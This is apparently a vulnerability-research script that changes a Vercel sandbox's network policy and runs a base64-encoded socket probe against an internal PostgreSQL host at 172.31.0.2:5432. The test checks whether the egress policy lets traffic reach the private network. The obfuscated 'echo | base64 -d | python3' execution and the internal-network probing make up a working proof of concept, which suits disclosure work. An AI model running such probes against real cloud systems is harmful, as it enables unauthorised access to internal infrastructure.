# -*- coding: utf-8 -*-
"""E5 反转对照复跑 (D 线报告核心证据稳定性确认)
A: custom allow httpbin.org     -> PG 172.31.0.2:5432 应 b'S' (漏洞面)
B: custom allowedCIDRs=[172.31.0.0/16] -> PG 应 113 (显式配置反而不可达)
C: 切回 allow httpbin.org       -> PG 应 b'S' (复现)
"""
import base64, json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('npol1 sid:', sid, 'status:', d['sandbox']['status'], flush=True)
if d['sandbox'].get('status') != 'running':
    c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s&resume=true' % (TEAM, PROJ))
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    print('resumed sid:', sid, flush=True)
    time.sleep(5)

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

PG_CODE = '''import socket,struct,time
s=socket.socket(); s.settimeout(4)
rc=s.connect_ex(('172.31.0.2',5432))
print('PG_CONNECT', rc)
if rc==0:
    s.sendall(struct.pack('!II',8,80877103))
    time.sleep(0.8)
    try:
        d=s.recv(4); print('PG_RESP', d)
    except Exception as e:
        print('PG_ERR', type(e).__name__)
'''

def pg_probe(tag):
    b64 = base64.b64encode(PG_CODE.encode()).decode()
    sc = 'echo %s | base64 -d | python3' % b64
    c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=30000)
    out = parse_data(r).strip()
    print('[%s] %s' % (tag, out[:150]), flush=True)
    return out

def set_policy(body, tag):
    c, r = api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM), body)
    print('[%s] set ->' % tag, c, flush=True)
    time.sleep(3)
    c2, r2 = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
    try:
        d2 = json.loads(r2)
        np = d2.get('session', {}).get('networkPolicy') or d2.get('sandbox', {}).get('networkPolicy')
        print('    readback:', json.dumps(np), flush=True)
    except Exception:
        pass

# A: allow 域名
set_policy({"mode": "custom", "allowedDomains": ["httpbin.org"]}, 'A')
pg_probe('A-allow-domain-PG')

# B: allowedCIDRs 私有网段
set_policy({"mode": "custom", "allowedCIDRs": ["172.31.0.0/16"]}, 'B')
pg_probe('B-allow-VPC-CIDR-PG')

# C: 切回 allow 域名
set_policy({"mode": "custom", "allowedDomains": ["httpbin.org"]}, 'C')
pg_probe('C-back-to-domain-PG')

# D: 对照 deny-all
set_policy({"mode": "deny-all"}, 'D')
pg_probe('D-denymode-PG')

print('=== E5-REPRO DONE ===', flush=True)
